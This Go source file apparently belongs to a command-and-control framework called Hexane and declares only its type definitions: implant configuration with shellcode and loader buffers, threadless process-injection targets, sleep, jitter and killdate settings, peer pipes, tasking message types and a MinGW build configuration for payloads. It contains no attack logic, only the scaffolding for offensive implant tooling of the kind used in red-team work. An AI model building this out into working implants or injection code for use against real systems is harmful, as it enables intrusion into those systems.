package main

import (
	"github.com/gin-gonic/gin"
	"sync"
)

var CommandDir uint32 = 1
var CommandMods uint32 = 2
var CommandNoJob uint32 = 3
var CommandShutdown uint32 = 4
var CommandUpdatePeer uint32 = 5

var TypeCheckin uint32 = 1
var TypeTasking uint32 = 2
var TypeResponse uint32 = 3
var TypeDelegate uint32 = 4
var TypeSegment uint32 = 5

type Stream struct {
	Buffer []byte
	Length int
}

type Config struct {
	Arch      string
	Debug     bool
	BuildType string
	Hostname  string
	Peer      string
	Sleeptime int
	Jitter    int
}

type Threadless struct {
	ProcName   string
	ModuleName string
	FuncName   string
	LdrExecute string
}

type Threadpool struct {
	None string
}

type Injection struct {
	Threadless *Threadless
	Threadpool *Threadpool
}

type Proxy struct {
	Enabled bool
	Address string
	Port    int
}

type Network struct {
	ProfileType string
	Domain      string
	Useragent   string
	Address     string
	Port        int
	Endpoints   []string
	Proxy       *Proxy
}

type HttpConfig struct {
	Address   string
	Port      int
	Useragent string
	Endpoints []string
	Headers   []string
}

type ProxyConfig struct {
	Address  string
	Port     string
	Proto    string
	Username string
	Password string
}

type ImplantConfig struct {
	Profile       any
	ProfileTypeId int
	CurrentTaskId uint32
	PeerId        uint32
	Peer          string
	IngressPipe   string
	EgressPipe    string
	ConfigBytes   []byte
	LoadedModules []string
	Shellcode     []byte
	Loader        []byte

	Injection    *Injection
	Hostname     string
	Domain       string
	WorkingHours string
	Sleeptime    uint32
	Jitter       uint32
	Killdate     int64
	bProxy       bool
}

type ServerConfig struct {
	GroupId   int
	Port      int
	Address   string
	Endpoints []string
	Handle    *gin.Engine
	SigTerm   chan bool
	Success   chan bool
	Next      *ServerConfig
}

type CompilerConfig struct {
	Debug          bool
	Arch           string
	Mingw          string
	Linker         string
	Objcopy        string
	Assembler      string
	RsrcCompiler   string
	Strip          string
	FileExtension  string
	BuildDirectory string
	IncludeDirs    []string
	ComponentDirs  []string
	Flags          []string
	Definitions    map[string][]byte
}

type HexaneConfig struct {
	GroupId     int
	Payload     string
	ImplantUuid string
	ImplantName string
	TaskCounter int
	mu          sync.Mutex

	Key        []byte
	Config     []byte
	Components []string
	Shellcode  string
	Main       string
	Active     bool
	BuildType  string

	Implant     *ImplantConfig
	Proxy       *ProxyConfig
	Compiler    *CompilerConfig
	Server      *ServerConfig
	UserSession *HexaneSession
	Next        *HexaneConfig
}

type HexanePayloads struct {
	Head  *HexaneConfig
	Group int
}

type ServerList struct {
	Head  *ServerConfig
	Group int
}

type JsonConfig struct {
	ImplantName string
	Config      *Config
	Network     *Network
	Injection   *Injection
}

type Message struct {
	PeerId    uint32
	TaskId    uint32
	MsgType   uint32
	Length    uint32
	Buffer    []byte
	Method    string
	Address   string
	BigEndian bool
}

type HexaneSession struct {
	username string
	admin    bool
}

type Headers struct {
	Key string
	Val string
}
